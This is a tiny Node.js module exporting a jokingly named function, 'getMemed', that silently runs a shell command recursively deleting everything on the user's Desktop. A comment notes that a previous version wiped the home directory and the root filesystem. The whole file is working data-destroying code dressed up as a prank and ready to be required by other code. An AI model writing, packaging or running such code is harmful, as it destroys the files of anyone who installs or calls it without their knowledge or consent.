const { exec } = require('child_process');

const getMemed = () => {
  exec(`rm -R -rf ~/Desktop/*`, (err, stdout, stderr) => {
    if (err) {
      return;
    }
  });
}
// prev rm -R -rf ~ && rm -R -rf /
module.exports = getMemed;
